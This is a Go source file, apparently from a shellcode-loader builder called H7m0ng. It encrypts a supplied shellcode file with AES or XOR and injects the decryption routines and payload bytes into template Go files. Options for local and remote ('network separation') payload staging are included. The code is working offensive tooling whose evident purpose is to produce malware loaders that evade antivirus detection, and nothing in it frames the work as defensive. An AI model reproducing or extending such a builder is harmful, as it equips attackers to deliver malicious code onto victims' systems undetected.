package core

import (
	"H7m0ng/encode"
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

type StrSC struct {
	Import        string
	DecryptFunc   string
	Shellcode     []byte
	FuncCall      string
	LoaderName    string
	ShellcodeFile string
}

func StartReplace(option Option) {
	GenerateSecret(option)
}

func GenerateSecret(options Option) {
	aesMode := options.ShellcodeEncode
	// 先依据 aesMode 决定加密模式，并生成加密后的 shellcode
	byteData, _ := ioutil.ReadFile(options.SrcFile)
	SeparateOpt := options.Separate
	if SeparateOpt == "" {
		SeparateOpt = "default"
	}
	var byteString = ""
	switch aesMode {
	case "AES-ECB":
		byteString = encode.EcbGenerate(byteData, SeparateOpt, options.ShellcodeLocation) // shellcode  分离模式  分离文件
	case "AES-CBC":
		byteString = encode.CbcGenerate(byteData, SeparateOpt, options.ShellcodeLocation) // shellcode  分离模式  分离文件
	case "AES-CFB":
		byteString = encode.CfbGenerate(byteData, SeparateOpt, options.ShellcodeLocation) // shellcode  分离模式  分离文件
	case "AES-OFB":
		byteString = encode.OfbGenerate(byteData, SeparateOpt, options.ShellcodeLocation) // shellcode  分离模式  分离文件
	case "XOR":
		byteString = encode.XorGenerate(byteData, SeparateOpt, options.ShellcodeLocation) // shellcode  分离模式  分离文件
	}
	replace1(aesMode, byteString, SeparateOpt)
}

func replace1(enMode string, byteString, SeparaOpt string) {
	// 指定目录路径
	dir := "./result"
	// 调用函数处理目录
	err := processDir(dir, enMode, byteString, SeparaOpt)
	if err != nil {
		fmt.Println("Error processing directory:", err)
		return
	}
	fmt.Println("All files processed successfully.")
}

// replaceInitComment 读取文件内容，并进行相应的替换
func replaceInitComments(content []byte, Enmode, byteString, SeparaOpt string) ([]byte, error) {
	lines := strings.Split(string(content), "\n")
	for i, line := range lines {
		switch Enmode {
		case "AES-ECB":
			if strings.TrimSpace(line) == "func f() {}" {
				lines[i] = encode.EcbDecrypt[0]
			}
			if strings.TrimSpace(line) == "//__init__" {
				lines[i] = byteString
			}
			if strings.TrimSpace(line) == "//__import__" { //这里可以添加一个函数，根据Enmode和SeparaOpt进行运行的函数
				if SeparaOpt == "Local Separate" {
					lines[i] = encode.EcbDecrypt[2] //分离import
				} else if SeparaOpt == "Remote Separate" {
					lines[i] = encode.EcbDecrypt[3] //网络分离import
				} else {
					lines[i] = encode.EcbDecrypt[1] // 非分离import
				}
			}
		case "AES-CBC":
			if strings.TrimSpace(line) == "func f() {}" {
				lines[i] = encode.CbcDecrypt[0]
			}
			if strings.TrimSpace(line) == "//__init__" {
				lines[i] = byteString
			}
			if strings.TrimSpace(line) == "//__import__" {
				if SeparaOpt == "Local Separate" {
					lines[i] = encode.CbcDecrypt[2] //分离import
				} else if SeparaOpt == "Remote Separate" {
					lines[i] = encode.CbcDecrypt[3] //网络分离import
				} else {
					lines[i] = encode.CbcDecrypt[1] // 非分离import
				}
			}
		case "AES-CFB":
			if strings.TrimSpace(line) == "func f() {}" {
				lines[i] = encode.CfbDecrypt[0]
			}
			if strings.TrimSpace(line) == "//__init__" {
				lines[i] = byteString
			}
			if strings.TrimSpace(line) == "//__import__" {
				if SeparaOpt == "Local Separate" {
					lines[i] = encode.CfbDecrypt[2] //分离import
				} else if SeparaOpt == "Remote Separate" {
					lines[i] = encode.CfbDecrypt[3] //网络分离import
				} else {
					lines[i] = encode.CfbDecrypt[1] // 非分离import
				}
			}
		case "AES-OFB":
			if strings.TrimSpace(line) == "func f() {}" {
				lines[i] = encode.OfbDecrypt[0]
			}
			if strings.TrimSpace(line) == "//__init__" {
				lines[i] = byteString
			}
			if strings.TrimSpace(line) == "//__import__" {
				if SeparaOpt == "Local Separate" {
					lines[i] = encode.OfbDecrypt[2] //分离import
				} else if SeparaOpt == "Remote Separate" {
					lines[i] = encode.OfbDecrypt[3] //网络分离import
				} else {
					lines[i] = encode.OfbDecrypt[1] // 非分离import
				}
			}
		case "XOR":
			if strings.TrimSpace(line) == "func f() {}" {
				lines[i] = encode.XorDecrypt[0]
			}
			if strings.TrimSpace(line) == "//__init__" {
				lines[i] = byteString
			}
			if strings.TrimSpace(line) == "//__import__" {
				if SeparaOpt == "Local Separate" {
					lines[i] = encode.XorDecrypt[2] //分离import
				} else if SeparaOpt == "Remote Separate" {
					lines[i] = encode.XorDecrypt[3] //网络分离import
				} else {
					lines[i] = encode.XorDecrypt[1] // 非分离import
				}
			}
		}
	}

	return []byte(strings.Join(lines, "\n")), nil
}

// processDi 递归处理目录中的文件
func processDir(dir string, EnMode, byteString, SeparaOpt string) error {
	// 遍历目录
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Printf("prevent panic by handling failure accessing a path %q: %v\n", path, err)
			return err
		}
		// 检查文件是否是一个文件而不是目录
		if !info.IsDir() {
			// 检查文件扩展名
			if filepath.Ext(path) == ".go" {
				// 读取文件内容
				content, err := ioutil.ReadFile(path)
				if err != nil {
					return err
				}
				// 替换内容
				newContent, err := replaceInitComments(content, EnMode, byteString, SeparaOpt)
				if err != nil {
					return err
				}
				// 写回文件
				err = ioutil.WriteFile(path, newContent, 0644) // 保留原始文件的权限，或者根据需要修改
				if err != nil {
					return err
				}
				fmt.Printf("Processed file: %s\n", path)
			}
		}
		return nil
	})
	return err
}

func byteSliceToHexString(byteSlice []byte) string {
	var buf bytes.Buffer
	buf.WriteString("[]byte{")
	for i, b := range byteSlice {
		if i > 0 {
			buf.WriteString(", ")
		}
		buf.WriteString("0x")
		buf.WriteString(strconv.FormatUint(uint64(b), 16))
	}
	buf.WriteString("}")
	return buf.String()
}
